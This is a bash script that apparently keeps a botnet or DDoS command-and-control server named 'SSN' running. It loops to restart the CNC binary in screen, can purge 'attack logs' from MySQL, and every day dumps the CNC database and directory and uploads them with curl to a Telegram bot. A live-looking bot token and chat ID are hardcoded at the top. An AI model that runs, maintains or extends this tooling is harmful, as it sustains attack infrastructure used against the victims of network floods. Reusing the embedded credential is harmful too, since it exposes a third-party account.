#!/bin/bash

BOT_TOKEN="7580264532:AAFx51k-NzrPEU0zcEZAW2EJnOasefBpIIk"
CHAT_ID="-4570850964"

# IGNORE # https://api.telegram.org/bot$BOT_TOKEN/getUpdates # IGNORE #

CNC_DIRECTORY="/root/CNC"
DATABASE_FILENAME="/root/CNC/DATABASE.sql"
ZIP_FILENAME="/root/SSN_BACKUP.zip"

DIRECTORY_TO_BACKUP="/root/CNC"

LOG_TO_TELEGRAM=true
CLEAR_ATTACK_LOGS=false

CONFIG_PATH="assets/config.json"
DB_HOST="localhost"
DB_USERNAME=$(jq -r '.database.username' "$CONFIG_PATH")
DB_PASSWORD=$(jq -r '.database.password' "$CONFIG_PATH")
DB_TABLE=$(jq -r '.database.table' "$CONFIG_PATH")

{
    while true; do
        rm -rf "$DATABASE_FILENAME"
        rm -rf "$ZIP_FILENAME"
        mysqldump -u"$DB_USERNAME" -p"$DB_PASSWORD" "$DB_TABLE" > "$DATABASE_FILENAME"
        zip -r "$ZIP_FILENAME" $DIRECTORY_TO_BACKUP
        if [ "$LOG_TO_TELEGRAM" = true ];
        then
            curl -F "chat_id=$CHAT_ID" -F "document=@$ZIP_FILENAME" "https://api.telegram.org/bot$BOT_TOKEN/sendDocument"
        fi
        echo -e "\nDone backing up to: $ZIP_FILENAME. Sleeping for 24 hours."
        sleep 24h
    done
}&
if [ "$CLEAR_ATTACK_LOGS" = true ];
then
    {
        mysql_command="DELETE FROM \`logs\` WHERE \`time_sent\` + \`duration\` < UNIX_TIMESTAMP()"
        execute_mysql_command() {
            mysql -h "$DB_HOST" -u "$DB_USERNAME" -p"$DB_PASSWORD" "$DB_TABLE" -e "$mysql_command"
            if [ $? -eq 0 ]; then
                echo "MySQL command executed successfully."
            else
                echo "Error executing MySQL command."
            fi
        }
        while true; do
            execute_mysql_command
            sleep 1s
        done
    }&
fi
{
    start_SSN_in_screen() {
        cd $CNC_DIRECTORY; screen -d -m -S SSN_session ./SSN
    }
    is_SSN_session_running() {
        screen -ls | grep -q "SSN_session"
    }
    start_SSN_in_screen
    while true; do
        if ! is_SSN_session_running; then
            echo "SSN is not running, restarting. To see the issue, run: cd $CNC_DIRECTORY;./SSN"
            sudo sysctl -w net.ipv6.conf.all.disable_ipv6=1
            sudo sysctl -w net.ipv6.conf.default.disable_ipv6=1
            sudo sysctl -w net.ipv6.conf.lo.disable_ipv6=1
            start_SSN_in_screen
        else
            echo "SSN is already running. Doing nothing for 1 second."
        fi
        sleep 1s
    done
}

# SSN on top! https://t.me/tcpsyn_feedback / Space / https://t.me/tcpsyn
